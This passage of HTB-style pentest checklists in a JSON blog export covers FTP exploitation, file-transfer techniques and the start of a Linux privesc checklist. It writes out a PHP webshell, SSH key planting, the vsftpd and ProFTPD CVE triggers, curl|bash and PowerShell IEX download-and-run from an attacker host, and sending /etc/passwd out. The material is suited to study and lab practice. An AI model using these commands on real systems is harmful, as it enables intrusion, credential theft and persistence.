      "body": "<h1 id=\"ftp-enumeration-exploitation-checklist\">FTP // Enumeration &amp; Exploitation Checklist</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nFTP (File Transfer Protocol) — port <strong>21/tcp</strong> (data on 20/tcp in active mode).\nCommon service on HTB machines. Often configured with anonymous access, weak credentials, or vulnerable versions. Vector for file leaks, webshell uploads, and credential harvesting.</p>\n</blockquote>\n<hr>\n<h2 id=\"0-detection-version-enumeration\">0 // Detection &amp; Version Enumeration</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Nmap — identify FTP and version</li>\n</ul>\n<pre><code class=\"language-bash\">nmap -sC -sV -p 21 &lt;TARGET&gt;\nnmap -sV --script=ftp* -p 21 &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Manual banner grabbing</li>\n</ul>\n<pre><code class=\"language-bash\">nc -nv &lt;TARGET&gt; 21\n# or\ncurl -s ftp://&lt;TARGET&gt;/\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> FTP on non-standard ports</li>\n</ul>\n<pre><code class=\"language-bash\">nmap -sV -p- &lt;TARGET&gt; | grep ftp\n</code></pre>\n<blockquote>\n<p><strong>Common versions and CVEs</strong><br>\n- <code>vsftpd 2.3.4</code> → backdoor (CVE-2011-2523) — port 6200\n- <code>ProFTPD 1.3.5</code> → mod_copy RCE (CVE-2015-3306)\n- <code>Pure-FTPd</code> — generally secure, but check version\n- <code>Microsoft ftpd</code> → often linked to IIS, check anonymous access</p>\n</blockquote>\n<hr>\n<h2 id=\"1-anonymous-login\">1 // Anonymous Login</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Try anonymous login</li>\n</ul>\n<pre><code class=\"language-bash\">ftp &lt;TARGET&gt;\n# Username: anonymous\n# Password: (empty, or any email)\n\n# Or one-liner\nftp -n &lt;TARGET&gt; &lt;&lt;EOF\nuser anonymous anonymous@\nls -la\nbye\nEOF\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Nmap script for anonymous</li>\n</ul>\n<pre><code class=\"language-bash\">nmap --script=ftp-anon -p 21 &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> With curl</li>\n</ul>\n<pre><code class=\"language-bash\">curl -s ftp://anonymous:anonymous@&lt;TARGET&gt;/\ncurl -s ftp://anonymous:@&lt;TARGET&gt;/\n</code></pre>\n<blockquote>\n<p><strong>Anonymous = first check</strong><br>\nAnonymous access is the first test to perform on EVERY FTP service.\nIf active, enumerate all content before proceeding.</p>\n</blockquote>\n<hr>\n<h2 id=\"2-brute-force\">2 // Brute Force</h2>\n<blockquote>\n<p><strong>Warning</strong><br>\nAlways prefer credentials found in other services.\nBrute force only with confirmed username and targeted wordlist.</p>\n</blockquote>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Hydra</li>\n</ul>\n<pre><code class=\"language-bash\"># Single user\nhydra -l &lt;USER&gt; -P /usr/share/wordlists/rockyou.txt ftp://&lt;TARGET&gt;\n\n# User list\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://&lt;TARGET&gt;\n\n# Default credentials\nhydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://&lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> NetExec</li>\n</ul>\n<pre><code class=\"language-bash\">nxc ftp &lt;TARGET&gt; -u &lt;USER&gt; -p wordlist.txt\nnxc ftp &lt;TARGET&gt; -u users.txt -p passwords.txt --no-bruteforce\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Medusa</li>\n</ul>\n<pre><code class=\"language-bash\">medusa -h &lt;TARGET&gt; -u &lt;USER&gt; -P /usr/share/wordlists/rockyou.txt -M ftp\n\n## 3 // Content Enumeration\n\n- [ ] Recursive listing\n```bash\n# From FTP client\nftp&gt; ls -laR\nftp&gt; prompt off\nftp&gt; mget *\n\n# With wget (recursive download)\nwget -r ftp://anonymous:@&lt;TARGET&gt;/\nwget -r ftp://&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET&gt;/\n\n# With curl\ncurl -s ftp://&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET&gt;/ --list-only\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Configuration files / credentials</li>\n</ul>\n<pre><code class=\"language-bash\"># Search in the share\n*.conf, *.cfg, *.env, *.ini, *.php, *.xml, *.yml\nweb.config, .htaccess, .htpasswd\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Backups and archives</li>\n</ul>\n<pre><code class=\"language-bash\">*.zip, *.tar*, *.bak, *.sql, *.dump, *.old\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> SSH Keys</li>\n</ul>\n<pre><code class=\"language-bash\">id_rsa, id_ed25519, authorized_keys, *.pem\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Hidden files (dot files)</li>\n</ul>\n<pre><code class=\"language-bash\">ftp&gt; ls -la\n# Check: .bash_history, .bashrc, .ssh/, .git/\n</code></pre>\n<blockquote>\n<p><strong>Binary mode</strong><br>\nFor non-text files (zip, exe, db), always use <code>binary</code> mode:\n<code>ftp&gt; binary\nftp&gt; get file.zip</code></p>\n</blockquote>\n<hr>\n<h2 id=\"4-upload-exploitation\">4 // Upload &amp; Exploitation</h2>\n<h3 id=\"41-check-write-permissions\">4.1 // Check Write Permissions</h3>\n<pre><code class=\"language-bash\">ftp&gt; put test.txt\n# If it works: the share is writable\n</code></pre>\n<h3 id=\"42-upload-webshell-if-ftp-root-web-root\">4.2 // Upload webshell (if FTP root = web root)</h3>\n<blockquote>\n<p><strong>FTP + Web = RCE</strong><br>\nIf the FTP directory corresponds to the web server's document root (common on IIS + FTP), uploading a webshell grants direct RCE.</p>\n</blockquote>\n<pre><code class=\"language-bash\"># PHP webshell\necho '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' &gt; shell.php\nftp&gt; put shell.php\n# Then: http://&lt;TARGET&gt;/shell.php?cmd=id\n\n# ASPX webshell (IIS)\ncp /usr/share/webshells/aspx/cmdasp.aspx .\nftp&gt; binary\nftp&gt; put cmdasp.aspx\n# Then: http://&lt;TARGET&gt;/cmdasp.aspx\n</code></pre>\n<h3 id=\"43-upload-ssh-key\">4.3 // Upload SSH key</h3>\n<pre><code class=\"language-bash\"># If the share contains /home/&lt;user&gt;\nssh-keygen -f /tmp/ftpkey -N &quot;&quot;\nftp&gt; cd .ssh\nftp&gt; put /tmp/ftpkey.pub authorized_keys\nssh -i /tmp/ftpkey &lt;user&gt;@&lt;TARGET&gt;\n\n## 5 // Known CVEs\n\n### vsftpd 2.3.4 Backdoor (CVE-2011-2523)\n\n```bash\n# Trigger: login with username ending in &quot;:)&quot;\n# Opens shell on port 6200\nnmap --script=ftp-vsftpd-backdoor -p 21 &lt;TARGET&gt;\n\n# Manual\nnc -nv &lt;TARGET&gt; 21\nUSER test:)\nPASS anything\n# Then:\nnc -nv &lt;TARGET&gt; 6200\n</code></pre>\n<h3 id=\"proftpd-135-mod_copy-cve-2015-3306\">ProFTPD 1.3.5 mod_copy (CVE-2015-3306)</h3>\n<pre><code class=\"language-bash\"># Allows copying files to the server without authentication\nnc -nv &lt;TARGET&gt; 21\nSITE CPFR /etc/passwd\nSITE CPTO /var/www/html/passwd.txt\n# Then: curl http://&lt;TARGET&gt;/passwd.txt\n\n# Copy SSH key\nSITE CPFR /home/&lt;user&gt;/.ssh/id_rsa\nSITE CPTO /var/www/html/id_rsa\n</code></pre>\n<h3 id=\"ftp-bounce-attack\">FTP Bounce Attack</h3>\n<pre><code class=\"language-bash\"># Use the FTP server as a proxy for internal port scans\nnmap -Pn -b anonymous@&lt;TARGET&gt; &lt;INTERNAL_HOST&gt;\n</code></pre>\n<hr>\n<h2 id=\"6-ftp-ssltls-ftps\">6 // FTP + SSL/TLS (FTPS)</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Check TLS support</li>\n</ul>\n<pre><code class=\"language-bash\">nmap --script=ftp-ssl-cert -p 21 &lt;TARGET&gt;\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Connect with explicit TLS</li>\n</ul>\n<pre><code class=\"language-bash\">lftp -u &lt;USER&gt;,&lt;PASS&gt; -e &quot;set ftp:ssl-force true; ls; quit&quot; &lt;TARGET&gt;\n# or\ncurl --ftp-ssl ftp://&lt;USER&gt;:&lt;PASS&gt;@&lt;TARGET&gt;/\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Certificate may reveal hostname/domain\n```bash\nopenssl s_client -connect <TARGET>:21 -starttls ftp</li>\n</ul>\n<h2 id=\"recommended-execution-priority\">Recommended Execution Priority</h2>\n<blockquote>\n<p><strong>Quick Order</strong><br>\n1. Banner grab — FTP version and OS fingerprinting\n2. Anonymous login — first check, always\n3. Enumerate all content (files, backups, credentials, SSH keys)\n4. Check write permissions\n5. If writable + web root: upload webshell\n6. Check CVEs for the specific version (vsftpd, ProFTPD)\n7. Brute force only with confirmed username and targeted wordlist\n8. Credentials found here → try on SSH and other services</p>\n</blockquote>\n<hr>\n<h2 id=\"related-machines\">Related Machines</h2>\n<table>\n<thead>\n<tr>\n<th>Machine</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Remote</td>\n<td>FTP enumerated alongside NFS — banner only, the real foothold comes from NFS</td>\n</tr>\n</tbody>\n</table>"
    },
    {
      "title": "File Transfer — Techniques Checklist",
      "slug": "file-transfer-techniques-checklist",
      "date": "2026·02·26",
      "tags": [
        "htb",
        "filetransfer",
        "methodology",
        "enum"
      ],
      "desc": "Quick Choice",
      "body": "<h2 id=\"recommended-execution-priority\">Recommended Execution Priority</h2>\n<blockquote>\n<p><strong>Quick Choice</strong>  </p>\n<p><strong>Linux target:</strong>\n1. <code>wget</code> / <code>curl</code> → standard method\n2. <code>nc</code> → if wget/curl not available\n3. <code>/dev/tcp</code> → if no tools present\n4. <code>base64</code> → small files, interactive shell only</p>\n<p><strong>Windows target:</strong>\n1. Evil-WinRM <code>upload</code>/<code>download</code> → if you already have a session\n2. SMB share with auth (<code>impacket-smbserver</code>) → most versatile method\n3. <code>certutil</code> → one-liner, available everywhere\n4. PowerShell <code>iwr</code> → alternative to certutil\n5. <code>curl.exe</code> → Windows 10+\n6. <code>base64</code> → small files, fallback</p>\n</blockquote>\n<hr>\n<h1 id=\"file-transfer-techniques-checklist\">File Transfer // Techniques Checklist</h1>\n<blockquote>\n<p><strong>Context</strong><br>\nTechniques for transferring files between attacker and target in CTF/pentest scenarios.\nCovers: Linux and Windows, from basic methods to authenticated SMB shares and tunneling.\nConvention: <code>LHOST</code> = attacker, <code>RHOST</code> = target</p>\n</blockquote>\n<hr>\n<h2 id=\"0-quick-setup-for-the-attacker\">0 // Quick setup for the attacker</h2>\n<h3 id=\"http-server-python\">HTTP Server (Python)</h3>\n<pre><code class=\"language-bash\"># Port 80 (requires sudo)\nsudo python3 -m http.server 80\n\n# Custom port\npython3 -m http.server 8000\n\n# From a specific directory\npython3 -m http.server 8000 -d /path/to/files\n</code></pre>\n<h3 id=\"http-server-with-upload-uploadserver\">HTTP Server with upload (uploadserver)</h3>\n<pre><code class=\"language-bash\">pip3 install uploadserver\npython3 -m uploadserver 8000\n# Upload endpoint: POST /upload\n</code></pre>\n<h3 id=\"smb-server-impacket\">SMB Server (Impacket)</h3>\n<pre><code class=\"language-bash\"># Without authentication\nimpacket-smbserver share $(pwd) -smb2support\n\n# With authentication (requires Windows 10+)\nimpacket-smbserver share $(pwd) -smb2support -username user -password pass\n</code></pre>\n<h3 id=\"netcat-listener-receive-files\">Netcat listener (receive files)</h3>\n<pre><code class=\"language-bash\">nc -nvlp 4444 &gt; received_file\n</code></pre>\n<h3 id=\"ftp-server\">FTP Server</h3>\n<pre><code class=\"language-bash\">python3 -m pyftpdlib -p 21 -w\n# -w enables write (upload from target)\n</code></pre>\n<hr>\n<h2 id=\"1-download-to-target-attacker-target\">1 // Download to target (Attacker → Target)</h2>\n<h3 id=\"linux\">Linux</h3>\n<h4 id=\"wget\">wget</h4>\n<pre><code class=\"language-bash\">wget http://LHOST/file -O /tmp/file\n# Silent\nwget -q http://LHOST/file -O /tmp/file\n</code></pre>\n<h4 id=\"curl\">curl</h4>\n<pre><code class=\"language-bash\">curl http://LHOST/file -o /tmp/file\n# Direct execution in memory (script)\ncurl http://LHOST/script.sh | bash\n</code></pre>\n<h4 id=\"netcat\">Netcat</h4>\n<pre><code class=\"language-bash\"># Attacker (send)\nnc -nvlp 4444 &lt; file\n\n# Target (receive)\nnc LHOST 4444 &gt; /tmp/file\n</code></pre>\n<h4 id=\"bash-devtcp-no-tool\">Bash /dev/tcp (no tool)</h4>\n<pre><code class=\"language-bash\"># Download without wget/curl/nc\ncat &lt; /dev/tcp/LHOST/80 &gt; /tmp/file\n# Requires manual redirect // more practical with exec:\nexec 3&lt;&gt;/dev/tcp/LHOST/80; echo -e &quot;GET /file HTTP/1.0\\r\\nHost: LHOST\\r\\n\\r\\n&quot; &gt;&amp;3; cat &lt;&amp;3 &gt; /tmp/file\n</code></pre>\n<h4 id=\"scp-requires-ssh\">SCP (requires SSH)</h4>\n<pre><code class=\"language-bash\">scp user@LHOST:/path/to/file /tmp/file\n</code></pre>\n<h4 id=\"base64-copypaste\">Base64 (copy/paste)</h4>\n<pre><code class=\"language-bash\"># Attacker: encode\nbase64 -w0 file; echo\n\n# Target: decode (paste the string)\necho '&lt;BASE64_STRING&gt;' | base64 -d &gt; /tmp/file\n</code></pre>\n<blockquote>\n<p><strong>When to use base64</strong><br>\nUseful when there is no direct HTTP/SMB connectivity and you only have an interactive shell (copy/paste). Works for small files (&lt; 50KB).</p>\n</blockquote>\n<h3 id=\"windows\">Windows</h3>\n<h4 id=\"certutil\">certutil</h4>\n<pre><code class=\"language-powershell\">certutil -urlcache -split -f http://LHOST/file C:\\Windows\\Temp\\file\n</code></pre>\n<blockquote>\n<p><strong>certutil</strong><br>\nPresent by default on all Windows versions. It's Windows' <code>wget</code>. Can be flagged by AV/EDR.</p>\n</blockquote>\n<h4 id=\"powershell-downloadfile\">PowerShell // DownloadFile</h4>\n<pre><code class=\"language-powershell\"># Classic method\n(New-Object Net.WebClient).DownloadFile('http://LHOST/file','C:\\Windows\\Temp\\file')\n\n# Short alias\niwr http://LHOST/file -OutFile C:\\Windows\\Temp\\file\n\n# Full Invoke-WebRequest\nInvoke-WebRequest -Uri http://LHOST/file -OutFile C:\\Windows\\Temp\\file\n</code></pre>\n<h4 id=\"powershell-in-memory-execution-fileless\">PowerShell // In-memory execution (fileless)</h4>\n<pre><code class=\"language-powershell\"># PS1 script\nIEX(New-Object Net.WebClient).DownloadString('http://LHOST/script.ps1')\n\n# With Invoke-WebRequest\nIEX(iwr http://LHOST/script.ps1 -UseBasicParsing)\n</code></pre>\n<blockquote>\n<p><strong>Fileless</strong><br>\n<code>IEX</code> (Invoke-Expression) executes the script directly in memory without writing to disk. Useful for bypassing file-based AV.</p>\n</blockquote>\n<h4 id=\"powershell-bypass-policy\">PowerShell // Bypass policy</h4>\n<pre><code class=\"language-powershell\"># If execution policy blocks scripts\npowershell -ep bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString('http://LHOST/script.ps1')&quot;\n</code></pre>\n<h4 id=\"bitsadmin\">bitsadmin</h4>\n<pre><code class=\"language-powershell\">bitsadmin /transfer job /download /priority high http://LHOST/file C:\\Windows\\Temp\\file\n</code></pre>\n<h4 id=\"curl-windows-10\">curl (Windows 10+)</h4>\n<pre><code class=\"language-powershell\">curl.exe http://LHOST/file -o C:\\Windows\\Temp\\file\n</code></pre>\n<blockquote>\n<p><strong>curl on Windows</strong><br>\nUse <code>curl.exe</code> (not <code>curl</code>) because in PowerShell <code>curl</code> is an alias for <code>Invoke-WebRequest</code>.</p>\n</blockquote>\n<h2 id=\"2-upload-from-target-target-attacker\">2 // Upload from target (Target → Attacker)</h2>\n<h3 id=\"linux_1\">Linux</h3>\n<h4 id=\"curl-post\">curl POST</h4>\n<pre><code class=\"language-bash\"># Attacker: python3 -m uploadserver 8000\ncurl -X POST http://LHOST:8000/upload -F 'files=@/etc/passwd'\n</code></pre>\n<h4 id=\"netcat_1\">Netcat</h4>\n<pre><code class=\"language-bash\"># Attacker (receives)\nnc -nvlp 4444 &gt; received_file\n\n# Target (sends)\nnc LHOST 4444 &lt; /path/to/file\n</code></pre>\n<h4 id=\"scp\">SCP</h4>\n<pre><code class=\"language-bash\">scp /path/to/file user@LHOST:/tmp/file\n</code></pre>\n<h4 id=\"base64-copypaste_1\">Base64 (copy/paste)</h4>\n<pre><code class=\"language-bash\"># Target: encode\nbase64 -w0 /path/to/file; echo\n# Copy output → Attacker: decode\necho '&lt;BASE64_STRING&gt;' | base64 -d &gt; file\n</code></pre>\n<h3 id=\"windows_1\">Windows</h3>\n<h4 id=\"powershell-upload-post\">PowerShell // Upload POST</h4>\n<pre><code class=\"language-powershell\"># Attacker: python3 -m uploadserver 8000\n$body = @{ files = Get-Item -Path C:\\path\\to\\file }\nInvoke-RestMethod -Uri http://LHOST:8000/upload -Method Post -Form $body\n</code></pre>\n<h4 id=\"powershell-base64-via-webshellshell\">PowerShell // Base64 via webshell/shell</h4>\n<pre><code class=\"language-powershell\"># Target: encode\n[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\path\\to\\file'))\n# Copy output → Attacker: decode\necho '&lt;BASE64_STRING&gt;' | base64 -d &gt; file\n</code></pre>\n<h4 id=\"netcat-if-available\">Netcat (if available)</h4>\n<pre><code class=\"language-powershell\"># Upload via ncat\nncat LHOST 4444 &lt; C:\\path\\to\\file\n</code></pre>\n<hr>\n<h2 id=\"3-smb-share\">3 // SMB Share</h2>\n<blockquote>\n<p><strong>Preferred method on Windows</strong><br>\nSMB is native on Windows — no additional tools required. It allows both downloads and uploads transparently.</p>\n</blockquote>\n<h3 id=\"without-authentication\">Without authentication</h3>\n<pre><code class=\"language-bash\"># Attacker: start share\nimpacket-smbserver share $(pwd) -smb2support\n</code></pre>\n<pre><code class=\"language-powershell\"># Target: copy file\ncopy \\\\LHOST\\share\\file C:\\Windows\\Temp\\file\n\n# Target: run directly from share\n\\\\LHOST\\share\\tool.exe\n\n# Target: upload (target → attacker)\ncopy C:\\path\\to\\file \\\\LHOST\\share\\file\n</code></pre>\n<h3 id=\"with-authentication-windows-10\">With authentication (Windows 10+)</h3>\n<blockquote>\n<p><strong>Windows 10+ requires authentication</strong><br>\nFrom Windows 10 onwards, anonymous SMB connections to remote shares are blocked by default. Credentials are required.</p>\n</blockquote>\n<pre><code class=\"language-bash\"># Attacker: share with credentials\nimpacket-smbserver share $(pwd) -smb2support -username user -password pass\n</code></pre>\n<pre><code class=\"language-powershell\"># Target: mount as network drive\nnet use Z: \\\\LHOST\\share /user:user pass\n\n# Copy file\ncopy Z:\\file C:\\Windows\\Temp\\file\n\n# Upload\ncopy C:\\path\\to\\file Z:\\file\n\n# Run directly\nZ:\\tool.exe\n\n# Unmount when done\nnet use Z: /delete\n</code></pre>\n<h4 id=\"alternative-new-psdrive\">Alternative // New-PSDrive</h4>\n<pre><code class=\"language-powershell\">$pass = ConvertTo-SecureString 'pass' -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential('user', $pass)\nNew-PSDrive -Name S -PSProvider FileSystem -Root \\\\LHOST\\share -Credential $cred\n\n# Use\ncopy S:\\file C:\\Windows\\Temp\\file\ncopy C:\\path\\to\\file S:\\file\n\n# Remove\nRemove-PSDrive S\n</code></pre>\n<hr>\n<h2 id=\"4-evil-winrm-integrated-uploaddownload\">4 // Evil-WinRM (integrated upload/download)</h2>\n<pre><code class=\"language-bash\"># From the evil-winrm session\n*Evil-WinRM* PS C:\\&gt; upload /path/to/local/file C:\\Windows\\Temp\\file\n*Evil-WinRM* PS C:\\&gt; download C:\\path\\to\\remote/file /path/to/local/file\n</code></pre>\n<blockquote>\n<p><strong>The easiest way</strong><br>\nIf you already have an evil-winrm session, <code>upload</code>/<code>download</code> are the fastest method — no additional server to start.</p>\n</blockquote>\n<hr>\n<h2 id=\"5-ftp\">5 // FTP</h2>\n<h3 id=\"setup-attacker\">Setup attacker</h3>\n<pre><code class=\"language-bash\">python3 -m pyftpdlib -p 21 -w\n</code></pre>\n<h3 id=\"linux-target\">Linux target</h3>\n<pre><code class=\"language-bash\">ftp LHOST\n# Or one-liner\nftp -n LHOST &lt;&lt;EOF\nbinary\nget file\nbye\nEOF\n</code></pre>\n<h3 id=\"windows-target\">Windows target</h3>\n<pre><code class=\"language-powershell\"># Interactive FTP\nftp LHOST\n\n# FTP script (non-interactive)\necho open LHOST &gt; ftp.txt &amp; echo binary &gt;&gt; ftp.txt &amp; echo GET file &gt;&gt; ftp.txt &amp; echo bye &gt;&gt; ftp.txt &amp; ftp -s:ftp.txt\n</code></pre>\n<hr>\n<h2 id=\"6-scp-ssh\">6 // SCP / SSH</h2>\n<h3 id=\"download-attacker-target\">Download (attacker → target)</h3>\n<pre><code class=\"language-bash\"># From the target Linux\nscp user@LHOST:/path/to/file /tmp/file\n\n# From the target Windows (if OpenSSH is installed)\nscp user@LHOST:/path/to/file C:\\Windows\\Temp\\file\n</code></pre>\n<h3 id=\"upload-target-attacker\">Upload (target → attacker)</h3>\n<pre><code class=\"language-bash\"># From the attacker\nscp user@RHOST:/path/to/file ./file\n\n# From the target\nscp /path/to/file user@LHOST:/tmp/file\n</code></pre>\n<hr>\n<h2 id=\"7-advanced-techniques\">7 // Advanced Techniques</h2>\n<h3 id=\"php-if-present-on-target\">PHP (if present on target)</h3>\n<pre><code class=\"language-bash\"># Download via PHP CLI\nphp -r &quot;file_put_contents('/tmp/file', file_get_contents('http://LHOST/file'));&quot;\n</code></pre>\n<h3 id=\"python-if-present-on-target\">Python (if present on target)</h3>\n<pre><code class=\"language-bash\">python3 -c &quot;import urllib.request; urllib.request.urlretrieve('http://LHOST/file', '/tmp/file')&quot;\n\n# Python2\npython -c &quot;import urllib; urllib.urlretrieve('http://LHOST/file', '/tmp/file')&quot;\n</code></pre>\n<h3 id=\"perl-if-present-on-target\">Perl (if present on target)</h3>\n<pre><code class=\"language-bash\">perl -e 'use LWP::Simple; getstore(&quot;http://LHOST/file&quot;, &quot;/tmp/file&quot;);'\n</code></pre>\n<h3 id=\"ruby-if-present-on-target\">Ruby (if present on target)</h3>\n<pre><code class=\"language-bash\">ruby -e &quot;require 'net/http'; File.write('/tmp/file', Net::HTTP.get(URI('http://LHOST/file')))&quot;\n</code></pre>\n<h3 id=\"powershell-encodedecode-binaries-with-certutil\">PowerShell // Encode/decode binaries with certutil</h3>\n<pre><code class=\"language-powershell\"># Target → Attacker (encode in base64, copy/paste, decode)\ncertutil -encode C:\\path\\to\\file.exe encoded.txt\ntype encoded.txt\n# Copy content → Attacker\ncertutil -decode encoded.txt file.exe\n</code></pre>\n<h3 id=\"chisel-tunneling-proxy-for-complex-transfers\">Chisel (tunneling + proxy for complex transfers)</h3>\n<pre><code class=\"language-bash\"># Attacker\n./chisel server --reverse -p 8080\n\n# Target\n./chisel client LHOST:8080 R:socks\n\n# Then use proxychains to reach internal networks\nproxychains scp user@INTERNAL_HOST:/file ./file\n</code></pre>\n<h3 id=\"webdav\">WebDAV</h3>\n<pre><code class=\"language-bash\"># Attacker: start WebDAV server\npip3 install wsgidav\nwsgidav --host 0.0.0.0 --port 8080 --root /tmp/share --auth anonymous\n</code></pre>\n<pre><code class=\"language-powershell\"># Target Windows: copy file\ncopy \\\\LHOST\\DavWWWRoot\\file C:\\Windows\\Temp\\file\n\n# Or mount\nnet use X: http://LHOST:8080/\ncopy X:\\file C:\\Windows\\Temp\\file\n</code></pre>\n<hr>\n<h2 id=\"related-machines\">Related Machines</h2>\n<table>\n<thead>\n<tr>\n<th>Machine</th>\n<th>Technique</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Aero</td>\n<td>PowerShell + <code>Invoke-WebRequest</code> to stage CLFS exploit; <code>certutil</code> fallback when needed</td>\n</tr>\n<tr>\n<td>Buff</td>\n<td>PowerShell download for CloudMe binary; Ligolo for the tunnelled exploit transfer</td>\n</tr>\n<tr>\n<td>Escape</td>\n<td><code>smbget --recursive</code> for the Public share dump; later <code>certipy</code> ferries cert artifacts in/out</td>\n</tr>\n<tr>\n<td>Mailing</td>\n<td>Phishing payload (<code>.lnk</code> with UNC reference) delivered to capture NTLMv2 — file-staging is half the chain</td>\n</tr>\n<tr>\n<td>Remote</td>\n<td>WinRM file copy for GodPotato + winPEAS</td>\n</tr>\n</tbody>\n</table>"
    },
    {
      "title": "Linux Privilege Escalation — Checklist",
      "slug": "linux-privilege-escalation-checklist",
      "date": "2026·02·16",
      "tags": [
        "htb",
        "privesc",
        "linux",
        "methodology",
        "enum"
      ],
      "desc": "Quick Order 1. sudo -l — always the first check 2. History and files in home (/home/dev/, /home/*/) 3. Credentials in .config .cnf .conf files and .git 4. SUID/SGID and capabilities 5. Cron jobs and pspy 6. Internal services (localhost ports) 7. LinPEAS for catch-all 8. Kernel…",
      "body": "<h2 id=\"recommended-execution-priority\">Recommended Execution Priority</h2>\n<blockquote>\n<p><strong>Quick Order</strong><br>\n1. <code>sudo -l</code> — always the first check\n2. History and files in home (<code>/home/dev/</code>, <code>/home/*/</code>)\n3. Credentials in <code>.config .cnf .conf</code> files and <code>.git</code>\n4. SUID/SGID and capabilities\n5. Cron jobs and pspy\n6. Internal services (localhost ports)\n7. LinPEAS for catch-all\n8. Kernel exploit (last resort)</p>\n</blockquote>\n<hr>\n<h1 id=\"linux-privilege-escalation-checklist\">Linux Privilege Escalation // Checklist</h1>\n<blockquote>\n<p><strong>Context</strong><br>\n[TO DO] : \"Da cambiare in contesto generico, esempio shell su macchina x, quasi zero knowledge del target, dobbiamo enumerare in modo più efficientemente possibile per raggiungere il latheral, o vertical privilege escalation. Da i privesc più comuni a quelli più impegnativi ed articolati.\"</p>\n</blockquote>\n<hr>\n<h2 id=\"0-initial-setup\">0 // Initial Setup</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Shell stabilization</li>\n</ul>\n<pre><code class=\"language-bash\">python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm\nexport SHELL=/bin/bash\nstty rows 40 cols 160\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Transfer enumeration tools (linpeas, pspy) to the target machine</li>\n</ul>\n<pre><code class=\"language-bash\"># Attacker\npython3 -m http.server 8888\n# Target\ncd /tmp &amp;&amp; wget http://&lt;tun0_IP&gt;:8888/linpeas.sh &amp;&amp; chmod +x linpeas.sh\n</code></pre>\n<hr>\n<h2 id=\"1-system-information\">1 // System Information</h2>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> OS and kernel version</li>\n</ul>\n<pre><code class=\"language-bash\">uname -a\ncat /etc/os-release\ncat /proc/version\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Architecture</li>\n</ul>\n<pre><code class=\"language-bash\">arch\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Hostname and domain</li>\n</ul>\n<pre><code class=\"language-bash\">hostname\nhostname -f\n</code></pre>\n<ul class=\"task-list\">\n<li class=\"task-list-item\"><label class=\"task-list-control\"><input type=\"checkbox\"/><span class=\"task-list-indicator\"></span></label> Sensitive environment variables</li>\n</ul>\n<pre><code class=\"language-bash\">env\ncat /etc/environment\ncat /proc/*/environ 2&gt;/dev/null\n</code></pre>\n<hr>\n<h2 id=\"2-users-and-groups\">2 // Users and groups</h2>\n<ul 